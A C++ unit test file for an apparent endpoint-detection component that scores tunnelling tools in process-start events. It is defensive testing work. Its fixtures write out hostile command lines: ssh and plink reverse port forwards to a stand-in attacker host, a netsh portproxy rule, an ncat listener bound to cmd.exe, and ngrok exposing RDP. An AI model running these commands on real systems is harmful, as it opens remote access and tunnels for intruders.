#include "tunnel_tool_detector_tests.h"

#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "tunnel_tool_detector.h"

namespace {

#define TUN_CHECK(cond) Check((cond), #cond, __LINE__)

void Check(bool cond, const char* expr, int line) {
    if (!cond)
        throw std::runtime_error(
            "tunnel tool test failed at line " + std::to_string(line) +
            ": " + expr);
}

edr::Event ProcStart(const std::string& image, const std::string& cmdLine,
                     uint32_t pid) {
    edr::Event ev;
    ev.type = EDR_EVT_PROCESS_START;
    ev.pid = pid;
    ev.fields[edr::field::kImage] = image;
    ev.fields[edr::field::kCommandLine] = cmdLine;
    return ev;
}

void TestSshReverseForward() {
    edr::TunnelToolDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
        "ssh -R 3389:127.0.0.1:3389 user@evil.example.com", 3001);
    det.Enrich(ev);
    TUN_CHECK(ev.fields.count(edr::field::kTunnelScore) > 0);
    TUN_CHECK(ev.fields.at(edr::field::kTunnelScore) == "70");
    TUN_CHECK(ev.fields.at(edr::field::kTunnelSignals)
                  .find("port_forward") != std::string::npos);
    TUN_CHECK(ev.fields.at(edr::field::kTunnelTools) == "ssh");
}

void TestPlinkReverseForward() {
    edr::TunnelToolDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Users\\alice\\Downloads\\plink.exe",
        "plink -R 4444:10.0.0.5:22 -N root@1.2.3.4", 3002);
    det.Enrich(ev);
    TUN_CHECK(ev.fields.at(edr::field::kTunnelScore) == "80");
    TUN_CHECK(ev.fields.at(edr::field::kTunnelTools) == "plink");
    TUN_CHECK(ev.fields.at(edr::field::kTunnelVerdict) == "MALICIOUS");
}

void TestNetshPortproxy() {
    edr::TunnelToolDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\netsh.exe",
        "netsh interface portproxy add v4tov4 listenport=8080 "
        "connectaddress=203.0.113.9 connectport=80",
        3003);
    det.Enrich(ev);
    TUN_CHECK(ev.fields.at(edr::field::kTunnelScore) == "80");
    TUN_CHECK(ev.fields.at(edr::field::kTunnelSignals)
                  .find("portproxy_rule") != std::string::npos);
    TUN_CHECK(ev.fields.at(edr::field::kTunnelVerdict) == "MALICIOUS");
}

void TestNetcatListenerRelay() {
    edr::TunnelToolDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Users\\alice\\Downloads\\ncat.exe",
        "ncat -lvp 4444 -e cmd.exe", 3004);
    det.Enrich(ev);
    TUN_CHECK(ev.fields.at(edr::field::kTunnelScore) == "65");
    TUN_CHECK(ev.fields.at(edr::field::kTunnelSignals)
                  .find("listener_relay") != std::string::npos);
}

void TestNgrokClient() {
    edr::TunnelToolDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Users\\alice\\Downloads\\ngrok.exe",
        "ngrok tcp 3389", 3005);
    det.Enrich(ev);
    TUN_CHECK(ev.fields.at(edr::field::kTunnelScore) == "60");
    TUN_CHECK(ev.fields.at(edr::field::kTunnelSignals)
                  .find("tunnel_client") != std::string::npos);
}

void TestBenignSshNoStamp() {
    edr::TunnelToolDetector det(true);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
        "ssh admin@fileserver01", 3006);
    det.Enrich(ev);
    TUN_CHECK(ev.fields.find(edr::field::kTunnelScore) == ev.fields.end());
}

void TestNonTunnelToolNoStamp() {
    edr::TunnelToolDetector det(true);
    edr::Event ev = ProcStart("C:\\Windows\\System32\\notepad.exe",
                              "notepad.exe file.txt", 3007);
    det.Enrich(ev);
    TUN_CHECK(ev.fields.find(edr::field::kTunnelScore) == ev.fields.end());
}

void TestDisabledNoStamp() {
    edr::TunnelToolDetector det(false);
    edr::Event ev = ProcStart(
        "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
        "ssh -R 3389:127.0.0.1:3389 user@evil.example.com", 3008);
    det.Enrich(ev);
    TUN_CHECK(ev.fields.find(edr::field::kTunnelScore) == ev.fields.end());
}

} // namespace

void RunTunnelToolDetectorTests() {
    TestSshReverseForward();
    TestPlinkReverseForward();
    TestNetshPortproxy();
    TestNetcatListenerRelay();
    TestNgrokClient();
    TestBenignSshNoStamp();
    TestNonTunnelToolNoStamp();
    TestDisabledNoStamp();
}
